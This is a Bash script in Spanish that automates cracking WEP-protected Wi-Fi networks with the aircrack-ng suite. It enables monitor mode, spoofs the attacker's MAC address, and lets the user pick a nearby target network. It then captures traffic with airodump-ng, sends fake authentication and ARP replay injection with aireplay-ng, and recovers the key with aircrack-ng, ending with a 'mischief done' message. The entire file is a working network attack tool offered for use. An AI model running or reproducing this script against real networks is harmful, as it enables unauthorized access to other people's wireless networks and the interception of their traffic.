#!/bin/bash
# @filename: aire
# @author: r00tw33d

#definicion de los colores para mostrar la consola
cyan='\e[0;36m'
light='\e[1;36m'
red="\e[0;31m"
yellow="\e[0;33m"
white="\e[0;37m"
END='\e[0m'
#Lista de comandos a utilizar(y validar)
export macchanger=`which macchanger`
export aircrackNg=`which aircrack-ng`

##Extraemos el directorio base donde se localiza el aire.sh
export AIRE_BASE_PATH=`echo $(readlink -f $0) | xargs dirname`;

#Cargamos el archivo de las librerias donde tenemos definidas las funciones a usar.
source $AIRE_BASE_PATH/src/colors_vars.sh #libreria de las definiciones de los colores
source $AIRE_BASE_PATH/src/stdOutFunctions.sh #libreria de las funciones de la salida estandar

function validar_dependencias {
	echo -e "${yellow}Validando dependencias.${END}"
	num_error=0
	
	if [ ${macchanger} = '' ]; then
		echo -e "${red}Es necesario instalar ${macchanger}macchanger${END}"
		let num_error=$num_error+1
	fi
	if [ ${aircrackNg} = '' ]; then
		echo -e "${red}Es necesario instalar la suite air-crack${END}"
		let num_error=$num_error+1
	fi
	if [ ${num_error} -eq 0 ]; then
		echo "Dependencias cumplidas"
	else
        echo -e "${red}Numero de dependencias con errores ${num_error} .${END}"
        exit ${num_error}
	fi
}

function usage {
	echo $'\n\tUso:' $0 '<interface> [ MA:CA:DD:RE:SS | --dont-fake ]'
	echo $'\ti.e.\n\t\t ' $0 $'wlan0 --dont-fake\n'
	echo $'\tor\t\t' $0 $'wlan0\n'
}

function probe_interface {
	if [ -z "`iwconfig 2>&1 | grep -E "^$1\s+\w*\s+802\.11\w+\s+\w+"`" ]; then
		echo -e "${red}Se ha insertado una interfaz invalida${END}"
		exit 2
	fi
}

############################################################
# Configurando MAC address, el argumento recibido($1),
# A partir de este configuramos la mac
#
# @argumen $1 descripción del argumento 1.
# @return tipo descripcion de lo que regresa
# @link [URL de mayor infor]
############################################################
function config_mac_address() {
	local fabricante="desconocido"
	ifconfig ${INTERFAZ} down && ifconfig ${IFACE} down;
	echo -e "${BYellow}Configurando dirección MAC ${newMac}${Color_Off}${BCyan}";
	case "${1}" in
	#Sin argumento: le creamos una mac de forma aleatoria
		"")
			echo 'Creando MAC aleatoria'
			fabricante=`macchanger -a ${INTERFAZ} | grep ^Faked | grep -Eo "\(.*\)"`
		;;
	#dont-fake: Conserva su dirección MAC, NO recomendable
		--dont-fake)
			echo 'Conservando la MAC address actual...'
		;;
	#En otro caso: se espera una direccion MAC como segundo argumento
		*)
			if [ -z "`echo ${1} | grep -Eoi '([0-f]{2}:){5}[0-f]{2}'`" ]; then
				echo -e "${URed}No especificó una MAC ${1} address inválida.${Color_Off}"
				echo -e "${BCyan}Creando MAC aleatoria"
				fabricante=`macchanger -a ${INTERFAZ} | grep ^Faked | grep -Eo "\(.*\)"`
			else
				echo "Se usará ${1} como dirección MAC"
				fabricante=`macchanger -m ${fabricante} ${INTERFAZ} | grep ^Faked | grep -Eo "\(.*\)"`
			fi
		;;
	esac #end case
	ifconfig ${INTERFAZ} up && ifconfig ${IFACE} up
	export NEWMAC=`ifconfig ${INTERFAZ} | grep HW | grep -oEi '[0-f:]{17}'`
	echo -e "${BCyan}Direccion MAC ${On_IPurple}${NEWMAC}${BCyan}\nFabricante ${On_IPurple}${fabricante}${Color_Off}"
}
############################# aqui empieza la secuencia del guion ########################
#valiaciones previas.
validar_dependencias

# Verificando interfaz de red
if [ -z "$1" ]; then
        echo -e "${red}No se proporcionó interfaz de red.${END}"
        select_interface
else
	probe_interface $1
	if [ $RETVAL ]; then
		exit $RETVAL
	else
		INTERFAZ=$1
	fi
fi
echo "Trabajando con la interfaz ${INTERFAZ}..."

# Comprobando permisos
if [ "$(id -g)" -eq 0 ]; then
	# Verificando interfaz en modo Monitor
	IFACE=`iwconfig 2>&1 | cat - | grep Monitor | head -1 | grep -Eo "^\w+"`
	if [ -z "${IFACE}" ]; then
		echo -e "${cyan}Levantando interfaz modo Monitor...${END}"
		IFACE=`airmon-ng start ${INTERFAZ} | tail -n2 | grep -oE '^\w*'`
	fi
	echo ${IFACE} '... interfaz configurada.'

	#configuramos nuestra direccion MAC
	config_mac_address "$2"
	echo -e "Esperando 2 segundos\c" && sleep 1 && echo -e ".\c" && sleep 1 && echo -e ".\c" && sleep 1 && echo "."

	echo "Escaneando las redes Wi-Fi..."
        # Generamos los archivos temporales a usar
        infoPath=`mktemp -t aire_info-XXX`
        targetPath=`mktemp -t aire_target-XXX`
        #
        mostrarObjetivos "${INTERFAZ}" "$infoPath"
        echo -n $'\nNumero de Célula [XX]: '
        read CELL
        echo 'Preparando el atake...'
        # Se calcula ke informacion corresponde a la celula
        let HEAD=CELL*4
        cat $infoPath | head -n$HEAD | tail -n4 > $targetPath
        # Se extraen los datos del target
        BSSID=`cat $targetPath | grep Address | awk '{print $5}'`
        CHANNEL=`cat $targetPath | grep Channel | sed s/.*://g`
        ESSID=`cat $targetPath | grep ESSID | sed s/.*://g | sed s/\"//g`
	rm $infoPath $targetPath
        echo -e "Comenzando el almacenamiento de IVs en el canal $CHANNEL para\n$ESSID [$BSSID]"

	# sub-shell para la captura de IVs
	rm aire-tmp-* > /dev/null 2>&1
	(xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp ${IFACE} &)
        (while true; do
		echo Esperando a sintonizar el canal... && sleep 2 && echo done.
                echo -e "Lanzando la falsa autenticacion...\n(presione ctrl+c sobre la ventana para cerrarla)"
                (xterm -hold -e aireplay-ng --fakeauth=6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $NEWMAC ${IFACE} &)
                echo -n "Ha funcionado la falsa autenticacion? (Y/n) "
                read RES
                if [ "$RES" = 'Y' ]; then
                        exit
                fi
                echo -n "Se necesita de una MAC autorizada [aa:bb:cc:dd:ee:ff]: "
                read NEWMAC
                if [ -z "$NEWMAC" ]; then
                        echo 'Generando una propia mac'
                        continue
                fi
                echo 'Reiniciando la interfaz con nueva MAC...'
                ifconfig ${IFACE} down
                RES=`macchanger -m $NEWMAC ${IFACE} | grep Faked`
                if [ -z "$RES" ]; then
                        echo 'No especificó una MAC address válida. Configurando con cualkier otra.'
                        NEWMAC=`macchanger -a ${IFACE} | grep Faked | awk '{print $3}'`
                fi
                echo "Esperando dos segundos..." && sleep 2 && ifconfig ${IFACE} up
                echo 'Reiniciando airodump-ng...'
                killall airodump-ng && rm aire-tmp-*
                (xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp ${IFACE} &)
        done)

        echo 'Comenzando a inyectar paketes...'
        (xterm -hold -e aireplay-ng --arpreplay -e $ESSID -b $BSSID -h $NEWMAC ${IFACE} &)

        echo 'Presione enter cuando hayan suficientes IVs'
        read ENTER
        echo 'Lanzando el atake del Kraken }=:^{}<<' && sleep 2
        CRACKFILE=`ls | grep aire-tmp-0*.cap | tail -n1`
	aircrack-ng $CRACKFILE | strings 2>&1 | egrep Tested\|Fail\|FOUND
        echo 'Borrar archivos temporales? (y/n)'
        read RES
        if [ $RES = 'y' ]; then
                rm aire-tmp-* replay_arp*.cap cracken.tmp
        fi
        echo -e "${red}Matando procesos ${END}"
        killall xterm
        echo -e "${red}Terminando la interfaz en modo promiscuo${END}"
        airmon-ng stop ${IFACE}
        echo "${yellow}Travesura realizada. xD${END}"
else
        echo -e "${red}Eres r00t?${END}"
        echo "por favor use: ${0} como grupo de usuario root"
fi
